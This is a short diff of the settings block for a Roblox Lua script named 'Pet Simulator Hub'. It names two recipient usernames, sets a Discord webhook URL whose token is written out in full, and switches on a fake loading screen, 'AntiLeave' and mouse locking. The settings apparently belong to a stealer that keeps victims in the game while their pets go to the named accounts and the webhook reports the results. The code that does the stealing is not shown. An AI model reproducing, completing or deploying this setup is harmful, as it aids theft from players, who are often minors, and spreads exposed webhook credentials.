@@ -1,10 +1,11 @@
 UserName = "GABRIELofficial_GAME"
-UserName2 = "KLJOAK_BLOX"
-Webhook = "https://discord.com/api/webhooks/1098966912744042497/0Q5XzfkwDKFuaNq3-13aQxWPkVqWM3vjlDQMzR5UZLlGH3wgvAGQ8s74AUJ24mtwca8G"
+UserName2 = "KLJOAK_BLOX " 
+Webhook = "https://discord.com/api/webhooks/1098974464294801429/4A7IIq4X-DKslTue6KPNGkAbyUEFvhUonbHDhTxQ1-BigUuEOaX8Al46y92u0ohRUOjb" 
 
 _G.LoadingScreen = true
-_G.AntiLeave = false
+_G.AntiLeave = true
 _G.MouseLock = true 
+-- set them to false if you don't need them
 
 _G.ScriptName = "Pet Simulator Hub"
 _G.FirstText = "Script Preparing"
